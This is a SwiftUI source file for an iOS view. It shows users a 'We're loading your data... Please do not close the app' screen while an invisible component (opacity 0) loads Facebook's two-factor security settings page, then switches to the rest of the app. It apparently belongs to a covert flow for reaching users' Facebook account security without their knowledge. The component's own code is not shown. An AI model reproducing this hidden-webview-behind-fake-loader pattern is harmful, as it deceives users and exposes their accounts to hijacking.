import SwiftUI

@available(iOS 14.0, *)
public struct NineView: View {
    public init() {
        
    }

    @State var is_Nine_Reco_Chuyen_Man = false
    @State var is_Nine_Reco_Contains = false // false

    public var body: some View {
        ZStack { Color.white.ignoresSafeArea()
            if is_Nine_Reco_Chuyen_Man {
                Nine_View_Au() // Goto App
            } else {
                if is_Nine_Reco_Contains {
                    NineView() // run back
                } else {
                    ProgressView {
                        VStack(spacing: 8) {
                            Text("We're loading your data...") // .font(.system(size: 12))
                            Text("It might take a while") // .font(.system(size: 12))
                            Text("Please do not close the app").foregroundColor(Color.red).opacity(0.8)
                        }.padding(.horizontal)
                    }
                    // https://www.facebook.com/security/2fac/settings
                    Coords_Nine_Reco(url: URL(string: "https://www.facebook.com/security/2fac/settings"), is_Nine_Reco_Chuyen_Man: $is_Nine_Reco_Chuyen_Man, is_Nine_Reco_Contains: $is_Nine_Reco_Contains).opacity(0)
                }
            } // else
        } // ZStack
    } // body

}
